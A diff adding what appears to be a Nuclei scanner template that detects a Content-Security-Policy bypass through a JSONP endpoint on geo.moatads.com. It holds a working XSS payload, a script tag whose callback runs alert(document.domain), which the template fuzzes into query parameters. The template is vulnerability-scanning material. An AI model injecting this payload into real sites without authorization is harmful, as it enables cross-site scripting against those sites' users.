@@ -1,0 +1,55 @@
+id: moatads-geo-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - MoatAds Geo
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,moatads-geo
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "moatads.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: moatads_geo_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://geo.moatads.com/n.js?callback=alert(document.domain)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "moatads_geo_csp_xss == true"
+# digest: 490a0046304402202b7e7aed88133f4e8c5eeea562be54b76c73dd396c2269a8488960c6cb466451022038ed020fd3c7852c75e3da958fe39a28a5eeb6d8639d022f4e2ad63aeb107f98:922c64590222798bb761d5b6d8e72950
